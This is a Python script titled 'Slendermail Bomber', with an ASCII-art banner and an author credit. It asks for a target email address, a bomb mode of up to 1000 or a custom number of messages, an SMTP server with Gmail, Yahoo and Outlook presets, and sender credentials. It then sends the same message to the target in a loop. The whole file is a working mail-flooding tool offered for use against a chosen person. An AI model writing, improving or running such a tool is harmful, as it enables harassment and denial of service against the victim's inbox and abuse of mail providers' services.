#!/usr/bin/env_python
import smtplib
import sys

class tcolors:
    BLUE = '\033[34m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

def slender():

    banner = ("""
                                   .dNd+:/yNNNm:                 /NNd+nDn/hNd`                          
                                  `mN/     `hMNd    .......      mMs       yN/                          
                                  oN+       /NMm   +`      :    .NN`       om.                          
                                  +No   --  oMMs  `:       -`    mN.   ...+y-                           
                                  `smhsy+  .NMm`  ..       ..    oNs   `--.                             
                                    `--`  `hMN-   ..       ..    .mN:                                   
                                          +NMs    `.       -      oNd`                                  
                                         mmMm`     :       :      mmNy                                  
                                         yNN/      `       .       sNN/                                 
                                        .mNN`       :     -        :NMd                                 
                                        :NMN        .`..- .        .NMN`                                
                                        -NMN-       : `  `:        +NNd                                 
                                         sNNd:`     .     .     `+NMN/                                 
                                         `smNmhso/:.-`-`.`.-..-/sdMNd/                                  
                                           -+dNNmmm/..-o-`./mmmmdhy:`                                   
                    .-/+oo+:.`               hNNmNNm--+o/--mmdmmdoh-           ``.---..`                
                 .+hmNNMMMNNNh/`            .mdNMNNNd.-o/-dNmhdhhdd/        `:shdmNNNNmho-              
               -yNNNmdhyhmNMNNNd+`          +mddNNNNMh.o+yNmNdhhdmdo      .odNNNdysoosdmNN+             
              /mNNs:`    `-+dNNNNd:         hNmmNmmmNNdoyNNNNmmhyNmo.   .omNNds:`      :dNN+            
             -mNm-           -sNNNNo`      -NNNhhNNmmmmmNNNNNNh.-NNy:  :dNmdo-.--.`     -NNd            
             ymN-       .:/:-` .yNNNd/`    hmNs`:NNmmddNmmmNNN-  yNm/-sNNNy-smNmddhs+`  .NNd            
             dNN       ohhdNMmo` :dNNNdo-`/NNs  `mmmhddNNmmmNy.``/NNoNNNd+`dNy-`   `+s  yNNo            
             sNN:          .dNNs  `+mNMNNdmNm/::/dNddmNMNNNMMNNNNNNMshh+` +My        +`sNNd`            
             .mNm:          yNMd    `/hNNNMNMNNNNNNNNmNNmNNNdmNNNNdmh+    +Ny        :dNmy`             
              -dNNy-       +NMN:       `:NNydmNNNmNMNmNNNmNydNdNnD+Ns-    sNd+-..-+hNmy:              
                                        \
                                        """)
    # My contact information
    dev_info = ("""             
                                    \tSlendermail Bomber v1.0  
                                      \tMade by sl0wl0ris21
                                    \tsl0wl0ris_anon@protonmail
                                  """)
    print(tcolors.RED + banner)
    print(tcolors.YELLOW + dev_info)


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(tcolors.BLUE + '\n|-[x]-[x]-[ Initializing program ]-[x]-[x]-|')
            self.target = str(input(tcolors.RED + 'Enter target email >>> '))
            self.mode = int \
                (input(tcolors.RED + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) >>> '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(tcolors.BLUE + '\n|-[x]-[x]-[ Setting up bomb ]-[x]-[x]-|')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(tcolors.RED + 'Choose CUSTOM amount >>> '))
            print(tcolors.RED + f'\n|-[x]-[x]-[ Executing BOMB mode: {self.mode} and {self.amount} emails ]-[x]-[x]-|')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(tcolors.BLUE + '\n|-[x]-[x]-[ Setting up email ]-[x]-[x]-|')
            self.server = str \
                (input(tcolors.RED + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook >>> '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(tcolors.BLUE + 'Enter port number >>> '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(tcolors.YELLOW + 'Enter from address >>>  '))
            self.fromPwd = str(input(tcolors.YELLOW + 'Enter from password >>> '))
            self.subject = str(input(tcolors.YELLOW + 'Enter subject >>> '))
            self.message = str(input(tcolors.YELLOW + 'Enter message >>> '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.connect()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(tcolors.BLUE + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(tcolors.RED + '\n|-[x]-[x]-[ ...Attacking... ]-[x]-[x]-|')
        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print(tcolors.BLUE + '\n|-[x]-[x]-[ ATTACK FINISHED!! ]-[x]-[x]-|')
        sys.exit(0)


if __name__=='__main__':
    slender()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()